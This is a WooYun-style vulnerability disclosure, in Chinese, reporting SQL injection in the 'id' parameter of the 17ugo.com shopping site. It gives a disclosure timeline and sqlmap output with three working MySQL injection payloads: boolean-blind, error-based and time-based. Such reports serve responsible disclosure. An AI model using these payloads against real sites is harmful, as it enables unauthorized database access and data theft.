wybug_title: 优购物www主站存在SQL注入漏洞
wybug_corp: 北京优购文化发展有限公司
wybug_detail:
漏洞详情 披露状态：   									2015-11-08：	细节已通知厂商并且等待厂商处理中									2015-11-13：	厂商已经确认，细节仅向厂商公开									2015-11-23：	细节向核心白帽子及相关领域专家公开									2015-12-03：	细节向普通白帽子公开									2015-12-13：	细节向实习白帽子公开									2015-12-28：	细节向公众公开  简要描述： 优购物www主站存在SQL注入漏洞 详细说明：  
http://www.17ugo.com/brand_com.php?id=1049&page=2
注入参数:id
sqlmap identified the following injection point(s) with a total of 441 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: id=1675 RLIKE (SELECT (CASE WHEN (3164=3164) THEN 1675 ELSE 0x28 END))&page=1    Type: error-based    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)    Payload: id=1675 AND EXTRACTVALUE(6379,CONCAT(0x5c,0x7171707671,(SELECT (ELT(6379=6379,1))),0x717a717071))&page=1    Type: AND/OR time-based blind    Title: MySQL <= 5.0.11 AND time-based blind (heavy query)    Payload: id=1675 AND 6198=BENCHMARK(5000000,MD5(0x6275717a))&page=1---[14:33:54] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.4.38back-end DBMS: MySQL 5.1
